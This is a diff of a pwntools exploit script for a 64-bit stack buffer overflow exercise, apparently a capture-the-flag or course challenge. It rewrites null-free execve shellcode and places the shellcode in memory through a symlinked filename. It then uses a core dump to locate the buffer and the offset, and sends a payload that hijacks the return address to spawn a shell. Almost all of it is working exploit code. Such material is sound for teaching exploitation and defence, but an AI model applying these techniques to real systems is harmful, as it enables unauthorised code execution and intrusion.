@@ -2,9 +2,9 @@ from pwn import *
 import os
 
 DEBUG = False 
-file = "./stack-ovfl-where-64"
 
-context.arch = 'x86-64'
+context.arch = "x86-64"
+context.bits = 64
 
 c_code = """
 #include <unistd.h>
@@ -21,48 +21,64 @@ with open("payload.c", "w") as f:
 
 os.system("gcc -o z payload.c")
 
+
 shellcode = asm('''
-mov    rsi,0x0
-mov    rdx,0x0
-mov    rax,0x3b
-
-push   0x0
+push   0x31
+pop    rax
+xor    al,0x31
+push   rax
+push   rax
+pop    rsi
+pop    rdx
 push   0x7a
-mov    rdi,rsp
 
+push   rsp
+pop    rdi
+push   0x3b
+pop    rax
 syscall
 ''')
 
+
+
+print(disasm(shellcode))
+
 env = {"PATH":"$PATH:."}
+file = './stack-ovfl-no-envp-no-argv-64'
+shellcode_file = f'./{shellcode.decode("utf8")}'
+if not os.path.isfile(shellcode_file):
+    os.symlink(file, shellcode_file)
+
 
 # crash the process to get a core file and find the buffer address (still boilerplate)
 
-io = process(file, env=env, setuid=False)
+io = process(shellcode_file, env=env, setuid=False)
 io.sendline(cyclic(10000)) 
-rip = p64(int(io.recvline_contains(b"rip").split(b'.')[0].split(b" ")[-1], 16))
+io.wait()
+core = io.corefile
+shellcode_address = core.stack.find(shellcode)
+print(shellcode_address)
+max_len = cyclic(10000).find(p64(core.fault_addr))
+print(max_len)
+os.unlink(core.path) 
 
-buf_len = cyclic(1000).find(rip)
-    
 # launch the main process (still boilerplate)
 if DEBUG:
     context.log_level = 'DEBUG'
     context.terminal = ['tmux', 'splitw', '-h']
-    io = gdb.debug(file, env=env, gdbscript='''
-b *0x0000000000400656
+    io = gdb.debug(shellcode_file, env=env, gdbscript='''
+b main
+b *0x0000555555554826
 continue
 ''')
-
 else:
-    io = process(file, env=env)
-
+    io = process(shellcode_file, env=env)
 
 # END SETUP BOILERPLATE
 # BEGIN CHALLENGE-SPECIFIC CODE
-print(f"len(shellcode) = {len(shellcode)}, max = {buf_len}")
 
-ret_addr = 0x00000000004004be
-buffer_address = int(io.recvline().split(b':')[1].strip(), 16)
-payload = shellcode + (b"A" * (buf_len - len(shellcode))) + p64(ret_addr) + p64(buffer_address)
+
+payload = int(max_len) * b"A" + p64(shellcode_address)
 io.send(payload)
 
 # END CHALLENGE-SPECIFIC CODE
